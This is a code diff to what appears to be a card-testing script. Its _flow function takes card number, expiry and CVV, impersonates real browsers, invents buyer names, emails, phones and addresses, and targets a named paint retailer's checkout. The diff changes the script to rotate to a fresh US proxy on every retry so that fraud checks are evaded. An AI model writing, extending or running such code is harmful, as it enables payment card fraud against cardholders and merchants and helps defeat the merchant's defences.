@@ -26,9 +26,13 @@ def _normalize_proxy(p: str) -> str:
 
 try:
     from api.proxies import get_proxy as _gate_get_proxy
-    _PROXY = _normalize_proxy(_gate_get_proxy('US') or os.getenv('WU_PROXY') or '')
+    def _get_proxy() -> str:
+        return _normalize_proxy(_gate_get_proxy('US') or os.getenv('WU_PROXY') or '')
+    _PROXY = _get_proxy()
 except Exception:
-    _PROXY = _normalize_proxy(os.getenv('WU_PROXY') or '')
+    def _get_proxy() -> str:
+        return _normalize_proxy(os.getenv('WU_PROXY') or '')
+    _PROXY = _get_proxy()
 
 _name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name())
 
@@ -55,7 +59,8 @@ def _flow(num, mes, ano, cvv):
     for _ in range(3):
         try:
             sess = creq.Session(impersonate=random.choice(['chrome110', 'chrome107', 'safari17_0']))
-            sess.proxies = {'https': _PROXY, 'http': _PROXY}
+            _px = _get_proxy()  # rotate a fresh geo-us session on every retry
+            sess.proxies = {'https': _px, 'http': _px}
             fn, ln = _name()
             em, ph, st = (_email(), _phone(), _street(fn))
             hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Origin': 'https://www.stencilsonline.com', 'Referer': 'https://www.stencilsonline.com/acrylic-paints/alizarin-crimson-acrylic-paint/'}
